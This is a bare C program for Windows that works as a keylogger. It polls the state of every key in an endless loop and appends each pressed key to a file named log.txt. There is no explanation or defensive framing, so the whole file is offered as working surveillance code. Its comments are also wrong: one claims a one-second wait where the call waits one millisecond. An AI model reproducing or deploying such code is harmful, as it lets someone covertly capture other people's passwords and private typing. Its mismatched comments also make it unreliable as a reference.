#include <stdio.h>
#include <windows.h>

int main() {
    while (1) {
        // Wait for 1 second
        Sleep(1);  // 1000ms == 1 second
        
        // Check for key presses
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {  // The 0x8000 bit indicates the key is pressed
                FILE *file = fopen("log.txt", "a");
                if (file != NULL) {
                    fprintf(file, "%c\n", key);
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
